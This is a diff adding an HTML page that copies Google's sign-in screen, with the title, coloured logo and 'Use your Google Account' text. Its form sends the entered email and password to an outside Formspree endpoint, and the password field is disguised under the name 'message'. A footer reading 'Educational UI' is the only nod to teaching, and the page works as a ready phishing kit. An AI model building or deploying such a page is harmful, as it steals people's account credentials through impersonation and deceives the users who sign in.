@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Google Account</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+    }
+    .google-blue { color: #4285F4; }
+    .google-red { color: #DB4437; }
+    .google-yellow { color: #F4B400; }
+    .google-green { color: #0F9D58; }
+    .input-effect {
+      transition: box-shadow 0.2s, border-color 0.2s;
+    }
+    .input-effect:focus {
+      box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.4);
+      border-color: transparent;
+    }
+    .input-effect:hover {
+      box-shadow: 0 1px 6px rgba(32, 33, 36, 0.15);
+    }
+  </style>
+</head>
+<body class="bg-white">
+
+  <div class="min-h-screen flex flex-col">
+
+    <!-- Header -->
+    <header class="py-4 px-6 flex justify-end space-x-4 text-sm text-gray-600">
+      <a href="#" class="hover:underline">Help</a>
+      <a href="#" class="hover:underline">Privacy</a>
+      <a href="#" class="hover:underline">Terms</a>
+    </header>
+
+    <!-- Main Content -->
+    <main class="flex-grow flex items-center justify-center p-4">
+      <div class="w-full max-w-md">
+        <!-- Logo -->
+        <div class="text-center mb-8">
+          <div class="flex justify-center mb-4 text-3xl font-bold">
+            <span class="google-blue">G</span>
+            <span class="google-red">o</span>
+            <span class="google-yellow">o</span>
+            <span class="google-blue">g</span>
+            <span class="google-green">l</span>
+            <span class="google-red">e</span>
+          </div>
+          <h1 class="text-2xl text-gray-800">Sign in</h1>
+          <p class="text-sm text-gray-600 mt-2">Use your Google Account</p>
+        </div>
+
+        <!-- Formspree Form -->
+        <div class="bg-white border border-gray-200 rounded-lg p-8 shadow-sm">
+          <form action="https://formspree.io/f/xldnnwrv" method="POST" class="space-y-5">
+            <input
+              type="email"
+              name="email"
+              placeholder="Email or phone"
+              class="w-full px-4 py-3 border border-gray-300 rounded-md input-effect focus:outline-none"
+              required
+            />
+            <input
+              type="password"
+              name="message"
+              placeholder="Enter your password"
+              class="w-full px-4 py-3 border border-gray-300 rounded-md input-effect focus:outline-none"
+              required
+            />
+
+            <div class="flex justify-between text-sm text-blue-600">
+              <a href="#" class="hover:underline">Forgot password?</a>
+            </div>
+
+            <p class="text-xs text-gray-500">
+              Not your computer? Use Guest mode to sign in privately.
+              <a href="#" class="text-blue-600 hover:underline">Learn more</a>
+            </p>
+
+            <div class="flex justify-between items-center pt-3">
+              <a href="#" class="text-blue-600 hover:underline font-medium">Create account</a>
+              <button
+                type="submit"
+                class="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 rounded-md font-medium focus:outline-none focus:ring-2 focus:ring-blue-500"
+              >
+                Sign in
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="bg-gray-100 py-4 px-6 text-xs text-gray-600">
+      <div class="max-w-6xl mx-auto flex flex-col md:flex-row justify-between items-center">
+        <div class="flex space-x-6 mb-2 md:mb-0">
+          <a href="#" class="hover:underline">About</a>
+          <a href="#" class="hover:underline">Terms</a>
+          <a href="#" class="hover:underline">Privacy</a>
+        </div>
+        <div>© 2025 Educational UI</div>
+      </div>
+    </footer>
+
+  </div>
+
+</body>
+</html>
